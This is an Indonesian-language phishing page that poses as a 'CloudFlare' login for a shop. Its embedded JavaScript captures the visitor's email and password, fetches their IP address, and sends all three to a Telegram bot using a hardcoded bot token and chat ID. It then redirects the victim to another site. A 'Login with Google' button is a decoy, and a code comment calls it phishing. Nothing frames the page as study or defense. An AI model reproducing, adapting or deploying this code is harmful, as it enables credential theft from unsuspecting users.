<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CloudFlare</title>
<style>
  body {
      background-image: url('https://files.catbox.moe/qm1fqn.jpeg');
      background-size: cover;
      background-position: center;
      color: #fff;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 15px #00f;
      width: 300px;
    }
    h1 {
      text-align: center;
      color: #0ff;
    }
    p {
      text-align: center;
      font-size: 14px;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      background-color: #333;
      color: #fff;
    }
    button {
      background-color: #00f;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background-color: #00ff00;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Selamat Datang</h1>
    <p>Silakan daftar atau masuk untuk mengakses Shop.</p>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email atau Gmail" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="button" onclick="loginWithGoogle()">Login with Google</button>
      <button type="submit">Masuk Sekarang</button>
    </form>
  </div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(event) {
event.preventDefault();
const email = document.getElementById('email').value;
const password = document.getElementById('password').value;

// Dapatkan IP address dari layanan eksternal
fetch('https://api.ipify.org?format=json')
.then(response => response.json())
.then(data => {
const ipAddress = data.ip;
kirimKeTelegram(email, password, ipAddress);
})
.catch(error => console.error('Gagal mendapatkan IP:', error));
});

function loginWithGoogle() {
// Ini hanya memicu form yang sama, sebagai phishing
alert('Anda akan login dengan Google. Masukkan detail Anda di bawah.');
// Form akan tetap digunakan untuk mengumpulkan data
}

function kirimKeTelegram(email, password, ipAddress) {
const token = '7506021552:AAGeMOdzFtnc9lgrbiDfJbtQ1b5yxYryMxw'; // Ganti dengan token bot Anda
const chatId = '8082614610'; // Ganti dengan chat ID Anda
const message = `Email/Gmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}`;

fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
method: 'POST',
headers: {
'Content-Type': 'application/json'
},
body: JSON.stringify({
chat_id: chatId,
text: message
})
})
.then(response => response.json())
.then(data => {
if (data.ok) {
window.location.href = 'https://website-all-produk-lightsecret.vercel.app'; // Redirect setelah berhasil
} else {
console.error('Gagal mengirim ke Telegram:', data);
}
})
.catch(error => console.error('Error:', error));
}
</script>
</body>
</html>
